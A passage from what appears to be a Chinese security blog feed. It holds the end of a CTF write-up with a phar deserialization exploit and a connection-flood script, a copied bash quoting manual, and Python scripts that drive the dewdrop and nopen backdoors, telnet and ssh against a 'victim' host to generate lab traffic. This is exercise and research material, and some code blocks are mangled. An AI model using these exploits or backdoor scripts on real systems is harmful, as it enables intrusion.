class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">        upload(check_session());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">        show(check_session());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>可以看到源码中利用create_function()构造了一个匿名函数，直接输出flag。那么重点就在于执行这个匿名函数。类Admin的析构函数中可以执行任意函数，包括在该析构函数中使用eval定义的一个函数。然而该匿名函数的函数名中含有随机字符串，<del>爆破是不可能爆破的，这辈子都不可能。</del></p><p>匿名函数并非没有名字，而是以<code>%00lambda_%d</code>命名，其中<code>%d</code>为数字，表示进程的第<code>%d</code>个匿名函数。可以通过发送大量请求迫使apache服务器开启一个新的进程，这样<code>%d</code>将重置为1。</p><p>因此，现在最重要的问题就是如果反序列化调用Admin类的析构函数。很容易找到checksession()中调用了unserialize()函数，但可惜的是这个反序列化函数无法利用，因为伪造cookie，直接修改session-data，会导致hash_equal()验证失败。</p><p>但是可以利用phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;avatar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;avatar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.jpg&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把生成的avatar.jpg放到vps上传。随后只需要通过file_get_contents()，file_put_contents()，或file_exists()之类的文件相关函数，使用<code>phar://</code>这个stream wrapper打开文件。在题目中需要再次利用upload()函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1</span><br></pre></td></tr></table></figure><p>官方wp有一个fork脚本，用于迫使apache开启新的进程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;xxxxx&#x27;</span></span><br><span class="line">        PORT = <span class="number">80</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET / HTTP/1.1\nHost: xxxxx\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, <span class="built_in">range</span>(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h3 id="（3）HITCON-2018"><a href="#（3）HITCON-2018" class="headerlink" title="（3）HITCON 2018"></a>（3）HITCON 2018</h3><h3 id="（4）hxp-ctf-2020-resonator"><a href="#（4）hxp-ctf-2020-resonator" class="headerlink" title="（4）hxp ctf 2020 resonator"></a>（4）hxp ctf 2020 resonator</h3><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1、<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">Phar File Format</a></p><p>2、<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></p><p>3、<a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>4、<a href="https://github.com/orangetw/My-CTF-Web-Challenges">My-CTF-Web-Challenges</a></p><p>5、<a href="https://www.jb51.net/article/48775.htm">Mysql中的排序规则utf8_unicode_ci、utf8_general_ci的区别总结</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bash下的转义</title>
      <link href="2020/12/12/bash%E4%B8%8B%E7%9A%84%E8%BD%AC%E4%B9%89/"/>
      <url>2020/12/12/bash%E4%B8%8B%E7%9A%84%E8%BD%AC%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="bash下的转义"><a href="#bash下的转义" class="headerlink" title="bash下的转义"></a>bash下的转义</h1><p>bash手册如下:<del>没错这篇博客是纯copy手册</del><span id="more"></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Quoting:</span><br><span class="line">Quoting is used to remove the special meaning of certain characters or words to the shell.  Quoting can be used to disable special treatment for special characters, to prevent reserved words from being recognized as such, and to prevent parameter expansion.</span><br><span class="line"></span><br><span class="line">       Each of the metacharacters listed above under DEFINITIONS has special meaning to the shell and must be quoted if it is to represent itself.</span><br><span class="line"></span><br><span class="line">       When the command history expansion facilities are being used (see HISTORY EXPANSION below), the history expansion character, usually !,  must  be  quoted  to  prevent  history  expansion.</span><br><span class="line"></span><br><span class="line">       There are three quoting mechanisms: the escape character, single quotes, and double quotes.</span><br><span class="line"></span><br><span class="line">       A  non-quoted backslash (\) is the escape character.  It preserves the literal value of the next character that follows, with the exception of &lt;newline&gt;.  If a \&lt;newline&gt; pair appears, and the backslash is not itself quoted, the \&lt;newline&gt; is treated as a line continuation (that is, it is removed from the input stream and effectively ignored).</span><br><span class="line"></span><br><span class="line">       Enclosing characters in single quotes preserves the literal value of each character within the quotes.  A single quote may not occur between single quotes, even when preceded by a backslash.</span><br><span class="line"></span><br><span class="line">       Enclosing  characters  in double quotes preserves the literal value of all characters within the quotes, with the exception of $, `, \, and, when history expansion is enabled, !.  When the shell is in posix mode, the ! has no special meaning within double quotes, even when history expansion is enabled.  The characters $ and `  retain  their  special meaning  within  double quotes.  The backslash retains its special meaning only when followed by one of the following characters: $, `, &quot;, \, or &lt;newline&gt;.  A double quote may be quoted within double quotes by preceding it with a backslash.  If enabled, history expansion will be performed unless an !  appearing in double quotes is  escaped  using  a  backslash.  The backslash preceding the !  is not removed.</span><br><span class="line"></span><br><span class="line">       The special parameters * and @ have special meaning when in double quotes (see PARAMETERS below).</span><br><span class="line">       </span><br><span class="line">       Words  of  the  form  $&#x27;string&#x27;  are treated specially.  The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard.  Backslash escape sequences, if present, are decoded as follows:</span><br><span class="line">              \a     alert (bell)</span><br><span class="line">              \b     backspace</span><br><span class="line">              \e</span><br><span class="line">              \E     an escape character</span><br><span class="line">              \f     form feed</span><br><span class="line">              \n     new line</span><br><span class="line">              \r     carriage return</span><br><span class="line">              \t     horizontal tab</span><br><span class="line">              \v     vertical tab</span><br><span class="line">              \\     backslash</span><br><span class="line">              \&#x27;     single quote</span><br><span class="line">              \&quot;     double quote</span><br><span class="line">              \?     question mark</span><br><span class="line">              \nnn   the eight-bit character whose value is the octal value nnn (one to three digits)</span><br><span class="line">              \xHH   the eight-bit character whose value is the hexadecimal value HH (one or two hex digits)</span><br><span class="line">              \uHHHH the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHH (one to four hex digits)</span><br><span class="line">              \UHHHHHHHH</span><br><span class="line">                     the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHHHHHH (one to eight hex digits)</span><br><span class="line">              \cx    a control-x character</span><br><span class="line"></span><br><span class="line">       The expanded result is single-quoted, as if the dollar sign had not been present.</span><br><span class="line"></span><br><span class="line">       A double-quoted string preceded by a dollar sign ($&quot;string&quot;) will cause the string to be translated according to the current locale.  If the current locale is C or POSIX,  the dollar sign is ignored.  If the string is translated and replaced, the replacement is double-quoted.</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info"><p>使用echo测试时，zsh和bash略有不同。zsh的<code>echo</code>相当于bash的<code>echo -e</code>。</p></div>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重复执行程序脚本</title>
      <link href="2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/"/>
      <url>2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>在项目组工作的过程中，遇到了一个任务：需要重复执行某程序，生成大量的流量。抓取流量，用于AI的学习。因此需要写脚本不断执行程序。我选择了python语言。</p><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><h3 id="（1）dewdrop"><a href="#（1）dewdrop" class="headerlink" title="（1）dewdrop"></a>（1）dewdrop</h3><p>dewdrop是一款linux后门软件。在靶机上运行dewdrop服务器后，就可以在攻击机上运行dewdrop客户端连接上靶机，实现远程控制。</p><p>我选择subprocess模块。subprocess模块允许启动一个新进程，并将它连接到标准输入/标准输出/标准错误管道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 6:</span><br><span class="line">        print(&#x27;\nUsage:\nrundewdrop.py [victim ip] [victim port] &#x27;</span><br><span class="line">              &#x27;[Listener ip] [Listener port] [Number of command]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    dport = int(sys.argv[2])</span><br><span class="line">    listener_ip = sys.argv[3]</span><br><span class="line">    listener_port = int(sys.argv[4])</span><br><span class="line">    command_number = int(sys.argv[5])</span><br><span class="line">    run_command = &#x27;./tipoff -i -r tcp -t &#123;&#125; -p &#123;&#125; -a &#123;&#125; -c &#123;&#125;&#x27;.format(dip, dport, listener_ip, listener_port)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(10)</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;command.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(10)</span><br></pre></td></tr></table></figure><p>使用方法：</p><ul><li><p>在tipoff同目录下新建一个command.txt文件。文件中每一行为所执行的命令。</p></li><li><p>运行程序，即可不断随机执行命令。</p></li><li><p>```<br>python rundewdrop.py   [victim ip] [victim port] [Listener ip] [Listener port] [Number of command]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （2）nopen</span><br><span class="line"></span><br><span class="line">nopen也是一款linux后门软件，使用方法与dewdrop类似。在靶机上运行nopen server后，可以使nopen client远程控制。</span><br><span class="line"></span><br><span class="line">然而，脚本却艰难重重。</span><br><span class="line"></span><br><span class="line">#### 1.subprocess模块</span><br><span class="line"></span><br><span class="line">我的第一选择当然是选择与dewdrop相同的方法，使用了subprocess模块。然而，却遇到了问题。nopen client出现了报错。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>error: failed to open global_output_file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">瞬间懵逼......</span><br><span class="line"></span><br><span class="line">有趣的是，这个nopen client程序还会骂人，还是骂20遍：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>What? are you nuts?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 2.其他重定向方法</span><br><span class="line"></span><br><span class="line">我还采取了其他重定向输入方法。如&lt;，管道符|，都遇到了一模一样的问题。仿佛只要重定向就会报错。</span><br><span class="line"></span><br><span class="line">#### 3.寻找原因</span><br><span class="line"></span><br><span class="line">既然找不到原因，就直接逆向分析......动调调试了很久，找到了报错的关键之处。</span><br><span class="line"></span><br><span class="line">运行nopen client后，每输入一条命令，都会尝试去运行fdopen函数。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>FILE* fdopen(int fildes,const char* mode); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fdopen的第一个参数为文件描述符。但是诡异的是：动调发现，运行到这里，打开的文件文件描述符为0。0正是标准输入流。打开文件成功即可继续运行。打开文件失败则报错退出。</span><br><span class="line"></span><br><span class="line">明明是在已经输入命令之后，难以理解为什么又会打开标准输入流。手动测试了fdopen这个函数。它确实能打开标准输入流，甚至向标准输入流中输出。然而一但进行重定向，这个函数就返回null。</span><br><span class="line"></span><br><span class="line">在钟sir的指导下，了解到了也存在0不是标准输入流的可能。程序是可以将0重定向到其他流的。</span><br><span class="line"></span><br><span class="line">继续逆向分析，却收效甚微......就算找到了错误的地方，也仍然不一定能找到解决方法。</span><br><span class="line"></span><br><span class="line">#### 4.termios模块伪造终端输入</span><br><span class="line"></span><br><span class="line">这是一个突发奇想，既然无法重定向输入，能否选择其他方式输入？一番搜索之下，找到了python的termios模块，可以伪造终端输入。</span><br><span class="line"></span><br><span class="line">在 Linux 中可以通过一组函数调用（通用终端接口，简称GTI）来控制终端。termios是在 POSIX 规范中定义的标准接口。python中的termios模块正是通过这个接口，从底层实现伪造终端输入。</span><br><span class="line"></span><br><span class="line">因此思路很简单：只需打开一个终端，运行nopen。再打开另一个终端，通过伪造输入向nopen所在终端输入命令，实现nopen重复的运行。</span><br><span class="line"></span><br><span class="line">脚本如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#!/usr/bin/python</p></li></ul><p>import sys,os,fcntl,termios<br>from random import choice<br>if len(sys.argv) != 3:<br>   sys.stderr.write(“usage: ttyexec.py tty command_number\n”)<br>   sys.exit(1)<br>fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)<br>command_number = int(sys.argv[2])</p><p>with open(‘commands.txt’, ‘r’) as f:<br>    command_list = [line.strip() for line in f.readlines()]</p><pre><code>for i in range(command_number):    cmd = choice(command_list)    for j in range(len(cmd)):       fcntl.ioctl(fd, termios.TIOCSTI, cmd[j])    fcntl.ioctl(fd, termios.TIOCSTI, &#39;\n&#39;)</code></pre><p>os.close(fd)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在我自己的环境终于测试成功！！！，然而......AI的人在docker运行出错了。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">AI方向使用docker运行脚本，docker运行的过程中报错如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IOError:[Errno 1]Operation not permitted</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">明显是一个权限问题。去百度了这个问题，确实是权限不足。</span><br><span class="line"></span><br><span class="line">百度到的问题是root权限尝试修改某些特殊文件出现这个报错，原因在于文件属性。查看文件属性可以发现文件有属性i，可以确保文件不被修改。执行比chmod更底层的命令chattr，可以修改文件属性，随后便可以修改文件。</span><br><span class="line"></span><br><span class="line">然而，这对解决问题没有太大帮助。因为无法用chattr命令去修改/der/pts/tty的属性。</span><br><span class="line"></span><br><span class="line">#### 5.最终方法</span><br><span class="line"></span><br><span class="line">经历了许久，最后突然想到可以绕过这个问题。在伪造终端输入的时候，向其他终端伪造输入是需要管理员权限的，但是在运行该脚本的自身终端输入则不需要管理员权限。可以控制脚本sleep几秒，并后台运行。再打开nopen，就可以实现重复执行命令。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#!/usr/bin/python</p><p>import sys,os,fcntl,termios<br>from random import choice<br>if len(sys.argv) != 3:<br>   sys.stderr.write(“usage: ttyexec.py tty command_number\n”)<br>   sys.exit(1)<br>fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)<br>command_number = int(sys.argv[2])<br>sleep(10)</p><p>with open(‘commands.txt’, ‘r’) as f:<br>    command_list = [line.strip() for line in f.readlines()]</p><pre><code>for i in range(command_number):    cmd = choice(command_list)    for j in range(len(cmd)):       fcntl.ioctl(fd, termios.TIOCSTI, cmd[j])    fcntl.ioctl(fd, termios.TIOCSTI, &#39;\n&#39;)</code></pre><p>os.close(fd)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line">- commands.txt 执行命令的内容（需要与ttyexec.py在同一目录下）</span><br><span class="line"></span><br><span class="line">- commands.txt每一行为需要执行的命令</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  $ python ttyexec.py tty 100 &amp;</span><br></pre></td></tr></table></figure><ul><li>在同一终端运行nopen client</li></ul><h3 id="（3）telnet"><a href="#（3）telnet" class="headerlink" title="（3）telnet"></a>（3）telnet</h3><p>实现telnet的重定向方法很多，这里采用与dewdrop相同的方法，使用subprocess模块。不同之处仅仅在于需要输入用户名和密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&#x27;\nUsage:\nruntelnet.py [victim ip] [username] [passwd] [commands number]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    username = sys.argv[2]</span><br><span class="line">    passwd = sys.argv[3]</span><br><span class="line">    command_number = int(sys.argv[4])</span><br><span class="line">    </span><br><span class="line">    run_command = &#x27;telnet &#123;&#125; &#x27;.format(dip)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(username)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(passwd)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.write(str(i) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;exit\n&quot;)</span><br></pre></td></tr></table></figure><p>使用方法：</p><ul><li><p>运行环境python2</p></li><li><p>需要在同一目录新建一个commands.txt，commands.txt中每一行为所需执行的命令。</p></li><li><p>运行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python runtelnet.py &#123;ip地址&#125; &#123;用户名&#125; &#123;密码&#125; &#123;发包个数&#125;</span><br></pre></td></tr></table></figure></li><li><p>已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）</p></li></ul><h3 id="（4）ssh"><a href="#（4）ssh" class="headerlink" title="（4）ssh"></a>（4）ssh</h3><p>ssh会自动检测输入是否被重定向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal</span><br></pre></td></tr></table></figure><p>可以使用-tt强制分配为伪终端，即使标准输入不是终端。尽管如此，ssh的密码依然无法通过重定向输入，需要手动输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print(&#x27;\nUsage:\nrunssh.py [victim ip] [commands number]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    command_number = int(sys.argv[2])</span><br><span class="line">    </span><br><span class="line">    run_command = &#x27;ssh -tt &#123;&#125; &#x27;.format(dip)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            